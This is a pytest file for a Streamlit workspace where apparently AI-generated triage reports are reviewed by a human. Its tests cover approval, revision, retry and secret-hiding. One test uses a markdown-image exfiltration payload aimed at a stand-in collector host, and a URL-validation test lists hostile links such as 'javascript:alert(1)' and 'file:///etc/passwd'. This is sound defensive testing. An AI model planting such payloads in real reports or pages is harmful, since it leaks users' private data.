"""Exercise deep-investigation actions with an isolated, offline service."""
from __future__ import annotations

from copy import deepcopy
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from triage_desk.agent_ui import _https_url


class FakeSettings:
    def __init__(self, ready=True):
        self.ready = ready

    def readiness(self):
        return {
            'ready': self.ready,
            'missing': [] if self.ready else ['FIREWORKS_API_KEY', 'FIREWORKS_MODEL'],
            'model': 'accounts/fireworks/models/test-model' if self.ready else '',
            'search_enabled': False,
            'tracing_enabled': False,
        }


def pending_case():
    return {
        'case_id': 'case-001', 'question': 'Uploaded CSV resets after a rerun.',
        'version': '1.50', 'code_context': '', 'status': 'awaiting_review',
        'review_notes': '', 'created_at': '2026-10-22T10:00:00Z',
        'updated_at': '2026-10-22T10:01:00Z',
        'report': {
            'quality_review': {'status': 'completed', 'retained_findings': 1, 'removed_findings': 0,
                               'removed_next_steps': 0, 'finding_verdicts': [], 'next_step_verdicts': []},
            'findings': [{
                'statement': 'Widget interactions rerun the script.',
                'category': 'behavior', 'severity': 'medium',
                'support': [{'evidence_id': 'E1', 'quote': 'Streamlit reruns your script from top to bottom.'}],
            }],
            'next_steps': ['Check whether uploaded data is stored in session state.'],
            'missing_information': ['Share a minimal reproduction.'],
        },
    }


class FakeStore:
    def __init__(self, cases=()):
        self.cases = {case['case_id']: deepcopy(case) for case in cases}

    def list_cases(self):
        return deepcopy(list(self.cases.values()))

    def get_case(self, case_id):
        return deepcopy(self.cases.get(case_id))

    def events(self, case_id):
        return [{'event': 'report_ready', 'message': 'Report saved for review.',
                 'created_at': '2026-10-22T10:01:00Z'}]

    def evidence(self, case_id):
        return [{'evidence_id': 'E1', 'title': 'Script execution', 'kind': 'documentation',
                 'provider': 'local', 'source_id': 'doc-reruns', 'version': '1.50',
                 'url': 'https://docs.streamlit.io/develop/concepts/architecture',
                 'content_hash': 'abc123', 'retrieved_at': '2026-10-22T10:00:00Z',
                 'text': 'Streamlit reruns your script from top to bottom.'}]


class FakeService:
    def __init__(self, *, ready=True, cases=()):
        self.settings = FakeSettings(ready)
        self.store = FakeStore(cases)
        self.start_calls = []
        self.resume_calls = []
        self.retry_calls = []

    def start(self, question, version='', code_context='', progress=None, *, repository_context=False):
        self.start_calls.append((question, version, code_context))
        if progress:
            progress({'event': 'search_started', 'message': 'Searching local evidence.'})
        case = pending_case()
        case.update(question=question, version=version, code_context=code_context,
                    repository_context=repository_context)
        self.store.cases[case['case_id']] = deepcopy(case)
        return case

    def resume(self, case_id, decision, notes='', progress=None):
        self.resume_calls.append((case_id, decision, notes))
        case = self.store.cases[case_id]
        case['status'] = {'approve': 'approved', 'reject': 'rejected', 'revise': 'awaiting_review'}[decision]
        case['review_notes'] = notes
        if decision == 'revise':
            case['report']['next_steps'] = ['Revised investigation checks widget identity.']
        if progress:
            progress({'event': 'review_saved', 'message': 'Review recorded.'})
        return deepcopy(case)

    def retry(self, case_id, progress=None):
        self.retry_calls.append(case_id)
        self.store.cases[case_id]['status'] = 'awaiting_review'
        self.store.cases[case_id].pop('error', None)
        if progress:
            progress({'event': 'retry_started', 'message': 'Continuing saved work.'})
        return self.store.get_case(case_id)


def workspace(root, service):
    from pathlib import Path
    from triage_desk.agent_ui import render_deep_investigation
    render_deep_investigation(Path(root), object(), service=service)


def render(tmp_path: Path, service: FakeService) -> AppTest:
    return AppTest.from_function(workspace, args=(str(tmp_path), service), default_timeout=10).run()


def test_missing_configuration_disables_agent_without_running_it(tmp_path):
    service = FakeService(ready=False)
    app = render(tmp_path, service)
    assert not app.exception
    assert app.button(key='FormSubmitter:deep_new_investigation-Start deep investigation').disabled
    assert not service.start_calls
    assert not service.resume_calls
    assert any('FIREWORKS_API_KEY' in item.value for item in app.info)
    assert not any('API key' in widget.label for widget in app.text_input)


def test_start_renders_verified_report_and_approval_calls_service(tmp_path):
    service = FakeService()
    app = render(tmp_path, service)
    assert not service.start_calls, 'Opening the workspace must not invoke the agent'
    app.text_area(key='deep_question').input('  CSV upload resets.  ')
    app.text_input(key='deep_version').input('1.50')
    app.text_area(key='deep_code_context').input('st.file_uploader("CSV")')
    app.button(key='FormSubmitter:deep_new_investigation-Start deep investigation').click().run()
    assert not app.exception
    assert service.start_calls == [('CSV upload resets.', '1.50', 'st.file_uploader("CSV")')]
    assert app.selectbox(key='deep_case_picker').value == 'case-001'
    assert any('Streamlit reruns your script from top to bottom.' in item.value for item in app.text)
    assert any('Searching local evidence.' in item.value for item in app.text)
    assert any('Content hash: abc123' in item.value for item in app.text)
    app.text_area(key='deep_review_notes_case-001').input('Reproduction verified.')
    next(button for button in app.button if button.label == 'Submit review').click().run()
    assert not app.exception
    assert service.resume_calls == [('case-001', 'approve', 'Reproduction verified.')]
    assert service.store.get_case('case-001')['status'] == 'approved'
    assert any(item.value == 'Approved' for item in app.text)
    assert not any(button.label == 'Submit review' for button in app.button)


def test_pending_case_is_reviewable_in_a_new_session(tmp_path):
    service = FakeService(cases=[pending_case()])
    app = render(tmp_path, service)
    assert not service.start_calls
    assert app.selectbox(key='deep_case_picker').value == ''
    app.selectbox(key='deep_case_picker').select('case-001').run()
    assert not app.exception
    assert any(item.value == 'Awaiting your review' for item in app.text)
    assert any(button.label == 'Submit review' for button in app.button)
    app.radio(key='deep_review_decision_case-001').set_value('Reject report')
    next(button for button in app.button if button.label == 'Submit review').click().run()
    assert service.resume_calls == [('case-001', 'reject', '')]
    assert service.store.get_case('case-001')['status'] == 'rejected'
    assert not service.start_calls


def test_repository_context_checkbox_defaults_off_and_persists_explicit_choice(tmp_path):
    service = FakeService()
    app = render(tmp_path, service)
    assert app.checkbox(key='deep_repository_context').value is False
    app.text_area(key='deep_question').input('Inspect related helper code.')
    app.checkbox(key='deep_repository_context').check()
    app.button(key='FormSubmitter:deep_new_investigation-Start deep investigation').click().run()
    assert not app.exception
    assert service.store.get_case('case-001')['repository_context'] is True
    assert any('Enabled for this case' in item.value for item in app.caption)


def test_request_revision_preserves_feedback_and_renders_updated_report(tmp_path):
    service = FakeService(cases=[pending_case()])
    app = render(tmp_path, service)
    app.selectbox(key='deep_case_picker').select('case-001').run()
    app.radio(key='deep_review_decision_case-001').set_value('Request revision')
    app.text_area(key='deep_review_notes_case-001').input('Check widget identity.')
    next(button for button in app.button if button.label == 'Submit review').click().run()
    assert not app.exception
    assert service.resume_calls == [('case-001', 'revise', 'Check widget identity.')]
    assert any('Revised investigation checks widget identity.' in item.value for item in app.text)
    assert any(button.label == 'Submit review' for button in app.button)


def test_failed_case_retry_continues_the_saved_case(tmp_path):
    case = pending_case()
    case.update(status='failed', error='The model request timed out.')
    service = FakeService(cases=[case])
    app = render(tmp_path, service)
    app.selectbox(key='deep_case_picker').select('case-001').run()
    assert any('timed out' in item.value for item in app.text)
    assert not any(button.label == 'Submit review' for button in app.button)
    app.button(key='deep_retry_case-001').click().run()
    assert not app.exception
    assert service.retry_calls == ['case-001']
    assert service.store.get_case('case-001')['status'] == 'awaiting_review'
    assert not service.start_calls
    assert any(button.label == 'Submit review' for button in app.button)


def test_failed_new_evidence_review_has_precise_safe_diagnostic_and_no_approval(tmp_path):
    case = pending_case()
    case.update(status='failed', error='Independent evidence review could not finish.')
    case['report'].pop('quality_review')
    service = FakeService(cases=[case])
    service.store.events = lambda case_id: [{'phase': 'execution', 'status': 'error',
                                           'error_code': 'incomplete_coverage'}]
    app = render(tmp_path, service)
    app.selectbox(key='deep_case_picker').select('case-001').run()
    assert not app.exception
    assert any('has not completed' in item.value for item in app.info)
    assert not any('predates' in item.value for item in app.info)
    assert any('incomplete_coverage' in item.value for item in app.caption)
    assert not any(button.label == 'Submit review' for button in app.button)


def test_untrusted_report_content_is_plain_text_and_provider_exceptions_are_hidden(tmp_path):
    payload = '![private](https://collector.example.invalid/pixel?report=private)'
    case = pending_case()
    case['question'] = payload
    case['report']['findings'][0]['statement'] = payload
    service = FakeService(cases=[case])
    app = render(tmp_path, service)
    app.selectbox(key='deep_case_picker').select('case-001').run()
    assert not app.exception
    assert any(payload == item.value for item in app.text)
    assert not any('collector.example.invalid' in item.value for item in app.markdown)

    def unavailable(*args, **kwargs):
        raise RuntimeError('Authorization: Bearer do-not-display')

    service.start = unavailable
    app.text_area(key='deep_question').input('An issue')
    app.button(key='FormSubmitter:deep_new_investigation-Start deep investigation').click().run()
    assert not app.exception
    assert any('could not finish' in item.value for item in app.error)
    assert not any('do-not-display' in item.value for item in app.error)


@pytest.mark.parametrize('url', [
    'javascript:alert(1)', 'http://example.com', 'file:///etc/passwd',
    'https://name:password@example.com', 'https://example.com/white space',
    'https://[bad', '//example.com', None,
])
def test_source_links_reject_non_https_and_embedded_credentials(url):
    assert _https_url(url) == ''


def test_source_links_accept_explicit_https_sources():
    assert _https_url('https://docs.streamlit.io/test?q=rerun') == 'https://docs.streamlit.io/test?q=rerun'
def test_saved_case_dates_use_the_workspace_timezone():
    from triage_desk.agent_ui import _local_time
    assert _local_time('2026-10-23T05:15:32+00:00') == 'Oct 22, 2026 10:15 PM PDT'
    assert _local_time('unknown') == 'unknown'

